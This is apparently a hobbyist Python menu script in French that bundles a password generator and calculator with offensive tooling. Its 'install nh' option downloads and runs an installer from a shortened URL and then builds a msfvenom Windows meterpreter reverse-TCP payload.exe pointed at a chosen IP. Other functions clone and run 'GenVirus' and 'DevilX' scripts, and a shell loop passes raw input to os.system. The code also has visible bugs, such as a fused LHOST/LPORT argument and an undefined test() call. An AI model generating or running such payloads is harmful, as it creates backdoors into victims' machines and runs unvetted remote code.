import random
import os
import webbrowser
os.system("clear") 
print("\033[1;32") 

a =input("mmodule: ") 

webbrowser.open("https://github.com/EvilhackDKP")

def shell():
	while a =="shell":
		shell =input("shell.EvilhackDKP~$")
		os.system(shell)
		

	
def pwd():	
	if a =="pwd securited":
		demande_length_for_pass =input("quelle est la longeur du mot de passe: 		")	
		lower_case ="abcdefghijklmnopqrstuvwxyz"
		upper_case ="ABCDEFGHIJKLMNOPQRSTUVWXYZ"
		number ="0123456789"
		symbole ="@#€&_-()=%*':/!?+$€¥¢¤©®™~¿[]{}<>«»¡`;÷\|¦¬^×§¶°"
		use_for =lower_case + upper_case + number + symbole
		length_for_pass =int(demande_length_for_pass)
		password ="".join(random.sample(use_for, length_for_pass))
		print("your generated password is: " + password)
		
		

def nh():		
	if a =="install nh":
		print("ce module n'est que pour termux")
		os.system("apt update && apt upgrade")
		os.system("apt install wget")
		os.system("wget -O install-nethunter-termux https://off.ec/2MczZWr")
		os.system("chmod +x install-nethunter-termux")
		os.system("./install-nethunter-termux")
		print("repondre n a delete roots file ")
		os.system("nh")
		os.system("ls")
		ip =input("ip: ")	
		os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST=" + ip + "LPORT=4444 -f exe -o payload.exe")
		
	
def interpreter():	
	if a =="interpreter":
		os.system("python3")
		
	
def fake_help():	
	if a =="help":
		print("pas help mais help()")
		
	
	
def help():
	if a =="help()":
		print("shell:terminal python")
		print("pwd securited:mot de passe securise")
		print("install nh:install nethunter sur termux")
		print("interpreter:interpreter python3")
		print("time: donne l'heure")
		print("devilx: installe devilx")
		print("open link: ouvre mon github ;)")
		
	
def devilx():
	if a == "devilx":
		os.system("pkg update")
		os.system("pkg upgrade")
		os.system("pkg install git")
		os.system("git clone https://github.com/MrHacker-X/DevilX.git")
		os.system("cd DevilX")
		os.system("chmod +x *")
		os.system("bash setup.sh")
		
		
def open_lien():
		webbrowser.open("https://github.com/EvilhackDKP")
		webbrowser.open("https://f-droid.org/fr/")
		webbrowser.open("")
	
	
def time():	
	if a == "time":
		os.system("uptime")
		

def genvirus():
	os.system("apt update ; apt install git -y ; git clone git://github.com/Ign0r3dH4x0r/GenVirus.git ; cd GenVirus ; bash GenVirus.sh")

def calculator():
	a =input("quelle est le type d'operation que vous voulais executer: ")

	def addition():
		aa =input("premier nombre: ")
		ba =input("deuxieme nombre: ")
		print(int(aa) + int(ba))

	def soustraction():
		ps =input("premier nombre: ")
		ds =input("deuxieme nombre: ")
		print(int(ps)- int(ds))
	
	
	def multiplication():
		am =input("premier nombre: ")
		bm =input("deuxieme nombre: ")
		print(int(am) * int(bm))
	
	
	def division():
		ad =input("premier nombre: ")
		bd =input("deuxieme nombre: ")
		print(int(ad) / int(bd))
	
	
	while a == "addition":
		addition()
	
	
	
	
	while a == "soustraction":
		soustraction()
	
	
	
	while a =="multiplication":
		multiplication()
	
	
	
	while a =="division":
		division()
	
	

	if a != "addition"and "soustraction"and "multiplication"and "division":
		print("cette operation n'existe pas")
		print("//////////////////////////////////////////////////////////////////////////////////////////////////////////")
	
	
	
	if a =="sudo":
		print("qui est-tu ? quoi qu'il en soit tu t'interrese de près ou de loin a l'informatique. sache que d'autre commande son caché")



	if a =="msfvenom":
		print("oulalala,tu veux generer un payload ? c'est pas ici")
	
	
	if a =="msfconsole":
		print("pas de multi/handler !")

	if a =="whoami":
		print("pas root en tout cas !")
	
	
	if a =="whoami !?@#€[]!?":
		print("je suis... duc_kalipython !")
	
	
	if a =="python3":
		print("pas d'anaconda ni de python !")



	if a =="espion":
		print("je l'ai toujours pas sorti !")

	while a =="shell":
		shell =input("commande~#")
		os.system(shell)
	
	
	if a =="help":
		print("Quoi ?! tu veux que je t'aide ? non")
	
	
	if a =="fuzeIII":
		print("VIVE PALADIUM")
	
	
	
	if a =="hein":
		print("apagnan!")
	
	
	if a =="quoi":
		print("quoiquoubeh")
		


if a == "calculator":
	test()
	
	
if a == "time":
	time()

if a == "help()":
	help()
	
	
if a == "help":
	fake_help()
	
	
if a == "interpreter":
	interpreter()
	
	
if a == "install nh":
	nh()
	
	
if a == "pwd securited":
	pwd()
	
	
if a == "shell": 
	shell()

if a =="devilx":
	devilx()
	
if a =="open link":
	open_lien()
